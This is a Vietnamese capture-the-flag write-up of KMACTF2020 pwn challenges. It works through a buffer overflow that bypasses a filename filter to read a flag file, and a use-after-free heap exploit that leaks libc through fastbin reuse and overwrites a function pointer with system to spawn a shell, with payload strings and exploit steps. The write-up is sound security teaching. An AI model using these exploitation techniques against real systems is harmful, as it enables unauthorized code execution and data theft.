# KMACTF2020 - pwn challenges

## Table of Contents

- [k1 - 100p (easy)](#k1---100p-easy)
	* [1. Phân tích đề](#1-phân-tích-đề)
	* [2. Vulnerability](#2-vulnerability)
	* [3. Exploit](#3-Exploit)
- [k2](#k2)
	* [1. Phân tích đề](#1-phân-tích-đề-1)
	* [2. Vulnerability](#2-vulnerability-1)
	* [3. Exploit](#3-Exploit-1)

**NOTE**: k2, k3 đều dùng chung 1 libc
## k1 - 100p (easy)
### 1. Phân tích đề
```
Flag: /home/flag.txt
nc -v 42.112.213.91 9801
```
#### ta có binary khởi tạo các biến như sau:
- char **\*v4**: dùng để output ra buffer.
- FILE  **\*stream**: dùng để lưu giá trị trả về của các hàm như *fopen*, *fgets*.
- char **s**: gồm 0x40 bytes (đã được initialize thông qua *memset*).
- char **needle**: gồm 0x200 bytes và khởi tạo trước chuỗi 'flag' (nullbytes cho ở các giá trị còn lại).

#### flow của chương trình:
1. bên trong hàm **while**
- initialize **s**, đọc 200 bytes kí tự từ *stdin* rồi gán cho biến **s** và nullbyte ở vị trí cuối cùng `s[read(0, s, 0x200) - 1] = 0;`.
- điều kiện break *while*:`if(!strstr(s, needle))`

Dễ hiểu hơn ta hãy hiểu hàm *strstr* như thế này `strstr(haystack, needle)` (hay còn gọi là "mò kim đáy bể") vì hàm *strstr* sẽ so sánh chuỗi xuất hiện đầu tiên trong **needle** so với **haystack** và trả về con trỏ trỏ tới vị trí đầu tiên xuất hiện trong **haystack** (tức là chuỗi 'flag'), nếu trong **haystack** không có thì trả về null.

Vậy để break được vòng *while* này thì trong chuỗi input của chúng ta chỉ cần không có 'flag' là ta sẽ break ra được ngay. 

2. break ra khỏi vòng *while* và đến phần thực thi các lệnh của *do...while*:
- Output ra chuỗi đã nhập
- malloc cho **v4**
- gán 1 con trỏ trỏ về 1 file (nếu đọc được) cho **stream**
- điều kiện break: `if(!stream)`
Như vậy ta chỉ cần input 1 file name có tồn tại là có thể break ra khỏi được vòng while này. Lúc này thì chương trình sẽ output file từ **stream** đọc được

![test file stream](https://i.imgur.com/eONLPOz.png)

### 2. Vulnerability
Nếu người đọc để ý kĩ thì ta có thể thấy được lỗi **buffer overflow** cơ bản thông qua `s[read(0, s, 0x200) - 1] = 0;`. Như vậy, ta có thể overflow được **needle** từ **s**.

- Test với padding 'a'\*0x44

>chưa read buffer

![Imgur](https://i.imgur.com/dc8ZXRn.png)
>đã read buffer

![Imgur](https://i.imgur.com/YZgV8GD.png)

Như vậy, với lỗi *bof* này, chúng ta có thể làm gì?

### 3. Exploit
theo như đề bài hint cho chúng ta thì ta có flag ở `/home/flag.txt`, điều ta cần làm đó chính là bypass được check ở hàm `strstr`. Như vậy để có thể bypass được *strstr* và đọc được flag từ challenge thì trước tiên ta cần phải thay đổi byte đầu tiên của **needle** 
- Test với file "flag" (padding "flag\x00" + 'a'\*0x3c) (lưu ý nullbyte ở file mà chúng ta đọc)

![Imgur](https://i.imgur.com/HIj7O2d.png)
![Imgur](https://i.imgur.com/toVGqh0.png)

vậy ta chỉ cần pad với hint đề cho nữa là có flag rồi! 

`'/home/flag.txt\x00' + 'b'*0x32`

![Imgur](https://i.imgur.com/rzgz0tr.png)

Flag:  `KMACTF{I_got_null,U_got_null,Everyone_got_null!!}`

## k2 - 150p (medium)

### 1. Phân tích đề
```
hint: Use After Free
nc -v 42.112.213.91 9802
```
tóm gọn các chức năng của binary:
- 1). add
- 2). view
- 3). delete
---
- 1 struct:
```c
typedef struct abc{
	char* a;
	print* abcf;
}abc;
typedef void print(long a);
```
---
các biến global
```c
int abcc[300]; //???
abc *ga[256];
int ab[200]; //???
int count=1;
```
mình không rõ các biến *abcc*, *ab* có tác dụng gì?

---
giải thích các hàm trong binary:
#### 1. add
- hàm if dùng để check xem chúng ta đã malloc vượt quá số lượng cho phép chưa
- `abc *a = (abc*)malloc(8)` 

visualize heap chunk: (vì đây là 32bit nên mỗi block chunk gồm 4 bytes)
```
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   size of prev chunk          |   size of current chunk (0x16)|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   char *a                     |   print* abcf                 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
- input length và malloc
```c
cread(&aa,15);
a->a = (char*)malloc(atoi(aa));
```
hãy để ý ở đây là char \***a** được malloc thêm dựa trên số byte ta input vào, tức là a* sẽ trỏ vào malloc chunk kế tiếp
```
                 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                 |   size of prev chunk          |   size of current chunk (0x11)|
                 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+----------------|   char *a                     |   print* abcf                 |
|                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                |   size of prev chunk          |   size of current chunk (aa)  |
|                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|--------------->|...............................................................|
                 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
top chunk------->|   0x20fa1                     |...............................|
                 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
- input data
```c
cread(a->a,atoi(aa));
a->abcf = (print*)(long)abcprint;
```
input data vào trong chunk mà char \***a** trỏ tới
```
                 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                 |   size of prev chunk          |   size of current chunk (0x11)|
                 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+----------------|   char *a                     |   print* abcf = 0x0804873b    |<--- abcprint address
|                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                |   size of prev chunk          |   size of current chunk (aa)  |
|                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|--------------->|   user input..................................................|
                 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
top chunk------->|   0x20fa1                     |...............................|
                 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
- `ga[count]=a;` gán các giá trị vừa tạo vào struct list **ga** và sau đó tăng **count** lên 1

#### 2. view
- `int *arg = malloc(sizeof(*arg)*2);` malloc thêm 1 chunk ngay bên dưới user input và null block đầu tiên trong chunk
- lưu giá trị index (do user nhập) ở \*(arg+1) `*(arg+1) = atoi(aa);`
- pass địa chỉ của arg vào *doview*
doview đơn giản chỉ kiểm tra xem nếu trong struct list **ga[i]**  (với i là giá trị index được input) đã được free hay không nếu đã free thì output ra `error out bound` còn nếu chưa free thì gọi hàm *abcprint* của chunk trên

#### 3. delete
```c
	int z=1;
	if(strchr(aa,'a')){
			while(z<count){
			free(ga[z]->a);
			free(ga[z]);
			z++;
			}
		return;
	}
	else{
		z=atoi(aa);
		free(ga[z]->a);
		free(ga[z]);
		while(z<count){
			ga[z]=ga[z+1];
			z++;
		}
		ga[z+1]=0;
	}
```
ở đây chúng ta có 2 hướng để free data 
- dùng 'a' để free tất cả data 

khởi tạo 1 biến z với biến count làm giới hạn, rồi sau đó free data.
- chỉ định 1 index nào đó để free

khởi tạo z với index được chỉ định và free index đó. Sau đó lùi chunk sau về chunk đã free `ga[z]=ga[z+1]`.

2 chức năng trên đầu tiên sẽ free user input trước (theo hình trên) rồi sau đó mới free char \*a

---
tóm tắt lại các chức năng của binary:
- chúng ta có thể khởi tạo các heap chunk thông qua hàm *add*, input data vào các heap chunk đó
- thông qua hàm *view* ta có thể check các user input mà ta đã malloc
- ta có thể free chunks thông qua hàm *delete*

### 2. Vulnerability
nếu người đọc đã audit kĩ thì ta sẽ để ý hàm delete, chúng ta có thể dùng option 1 không giới hạn số lần!!! tức ta có thể free tại cùng 1 ô nhớ nhiều hơn 1 lần -> double-free!!!

nhưng ở đây mình không dùng double free để exploit mà sẽ dựa vào cách mà glibc allocate các heap chunks. Cách mà glibc xử lí các chunk này là dùng các bins - được định nghĩa: 
```
A bin is a list (doubly or singly linked list) of free (non-allocated) chunks. Bins are differentiated based on the size of chunks they contain:
1. Fast bin
2. Unsorted bin
3. Small bin
4. Large bin
```
trong wu này sẽ dùng fast bin để leak giá trị cũng như gọi shell để cat được flag nhưng trước tiên cần hiểu rõ fast bin như thế nào. (đọc [link](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html) để biết rõ thêm chi tiết)

đầu tiên ta thử add vào 2 chunk với 0x16 bytes

![Imgur](https://i.imgur.com/2eHAsHf.png)

sau đó free = option 1

![Imgur](https://i.imgur.com/XtreoqE.png)

như chúng ta biết thì fastbin list có tất cả 10 bins. mỗi bins dùng để chứa các size khác nhau (bao gồm header). theo như trên thì ta dùng đến 2 bins, là 0x10 và 0x20, 0x10 dành cho char \*a và 0x20 dành cho user input. vậy tại sao mình lại nói đến vấn đề này? vì trong fastbin, để tiết kiệm dung lượng bộ nhớ, nếu user malloc thêm 1 chunk size nhỏ hơn bins đã dùng trên lấy ví dụ 0x8 chẳng hạn, thì nó sẽ ghi đè lại giá trị của char \*a!!!

Testing: (add thêm 0x8 với data "got cha!")
![Imgur](https://i.imgur.com/S8QOZhG.png)

Dựa vào cách giải thích trên ta có thể tìm được cách gọi system rồi!!!
### 3. Exploit
Bây giờ ta sẽ bắt đầu setup fastbin để leak được địa chỉ của libc. Như đã giải thích ở trên, ta có thể overwrite hàm *abcprint* và char \***a**, vậy  ta có thể lợi dụng địa chỉ của *abcprint*  và thay giá trị của char \***a** thành 1 địa chỉ GOT bất kì thì ta có thể leak được địa chỉ của libc rồi!!!

Setting up fastbin leak:

Ta có thể add size bất kì để setup nhưng victim chunk (tức chunk dùng để overwrite) thì không được vượt quá 0x10 bytes vì như vậy ta sẽ không thể overwrite được giá trị cần leak(tức chỉ dùng bin 0x10)

![Imgur](https://i.imgur.com/RVSmF8p.png)

sau đó dùng hàm view chunk 1 là ta có thể leak được libc

![Imgur](https://i.imgur.com/sBql4Gy.png)

Đến đây chúng ta đã đi được 2/3 quãng đường. quãng đường còn lại chúng ta chỉ cần gọi system là có thành công. để tránh cho việc khó hình dung, mình sẽ tóm tắt lại quá trình: (vì index của binary khá là lộn xộn khi free)
```py
# có thể dùng size bất kì để setup fastbin
add(0x30, 'a'*0x16) # chunk 1
add(0x30, 'b'*0x16) # chunk 2
delete('a') # free cả chunk 0 và 1
add(0x8, [GOT addr] + [abcprint]) # chunk 3
# lúc này ta đã leak được libc
delete(2)
# tại sao lại delete(2)? để ý rằng lúc này count = 3 (tức ga[3] = victim chunk),z = 2 mà ta cần setup lại fastbin 
#(mà fastbin cần free chunk 2 lần), thì lúc này nó sẽ free chunk 3 (đang ở vị trí của chunk 1), đẩy lùi ga[3]
# về ga[2] và null ga[3]. Sau đó tăng z = 3  nên nó sẽ free lại chunk 2
#như vậy ta đã setup lại được 1 fastbin mới. lúc này ta chỉ cần gọi system thôi
add(0x8, ';sh;' + [system addr]) #chunk 4
```
theo lẽ thường thì đến đây là ta có thể cat được flag nhưng có vẻ do biến môi trường hay sao đó ta không có được shell

![Imgur](https://i.imgur.com/3UPY3jO.png)

thế là ta setup lại fastbin tiếp, cũng tương tự như trên ta dùng delete(2) để setup, sau đó add(0x8, 'sh\x00') là có thể gọi được shell

![Imgur](https://i.imgur.com/3LkMwU1.png)

do server down rồi nên mình dùng lại hình cũ

![Imgur](https://i.imgur.com/eJmY1BS.png)

Flag: KMACTF{Hey_toooo_much_free()\_called!!}
## k3 - 250p (hard)
### 1. Phân tích đề
hint: CVE 2018-6789
`vẫn đang làm...`